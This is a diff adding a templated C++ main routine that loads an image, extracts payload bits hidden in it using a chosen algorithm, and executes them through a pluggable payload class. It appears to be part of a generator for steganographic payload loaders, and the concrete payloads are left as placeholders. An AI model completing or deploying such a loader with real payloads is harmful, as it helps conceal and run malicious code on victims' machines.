@@ -1,0 +1,29 @@
+#include "reader.h"
+
+int _tmain(int argc, TCHAR** argv) {
+    if (argc == 3) {      
+        // Init Gdiplus
+        GdiplusStartupInput gdiplusStartupInput;
+        ULONG_PTR gdiplusToken;
+        GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
+
+        // Do the job
+        int payload_bits = _ttoi(argv[1]);
+        LPCTSTR location = argv[2];
+
+        auto img = ImageSources::{{delivery_method}}();
+        Bitmap* bmp = img.loadImage(location);
+
+
+        auto alg = Algorithms::{{algorithm}}({{algorithm_args}});
+        uint8_t* payload_data = alg.readImage(bmp, payload_bits);
+
+
+        auto pld = Payloads::{{payload_type}}();
+        pld.Run(payload_data, payload_bits);
+
+        // Shutdown Gdiplus
+        GdiplusShutdown(gdiplusToken);
+    }
+    return 0;
+}
